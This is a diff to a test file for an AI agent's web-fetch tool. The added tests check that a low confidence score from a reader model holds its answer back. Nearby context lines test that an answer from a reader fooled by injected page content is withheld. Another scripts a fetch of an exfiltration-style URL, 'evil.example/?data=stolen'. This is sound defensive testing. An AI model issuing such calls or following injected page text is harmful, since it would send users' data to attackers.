@@ -111,6 +111,17 @@ try {
   check("a fooled reader's answer is withheld", toolResult().includes("Withheld") && !toolResult().includes("evil.example/steal"));
   readerAnswer = "WAL lets readers carry on during a write.";
 
+  // A score from the reader.
+  readerAnswer = "Confidence: 2\nWAL might do something.";
+  script = [{ name: "web_fetch", args: { url: "https://docs.example.org/page", question: "x" } }];
+  await run("Read https://docs.example.org/page");
+  check("a low score holds the answer back", toolResult().includes("confidence was 2/10") && !toolResult().includes("might do something"));
+  readerAnswer = "Confidence: 9\nWAL lets readers carry on.";
+  script = [{ name: "web_fetch", args: { url: "https://docs.example.org/page", question: "x" } }];
+  await run("Read https://docs.example.org/page");
+  check("a good score goes to the agent", toolResult().includes("confidence: 9/10") && toolResult().includes("WAL lets readers carry on"));
+  readerAnswer = "WAL lets readers carry on during a write.";
+
   // A URL the model made up.
   script = [{ name: "web_fetch", args: { url: "https://evil.example/?data=stolen", question: "x" } }];
   await run("Say hi");
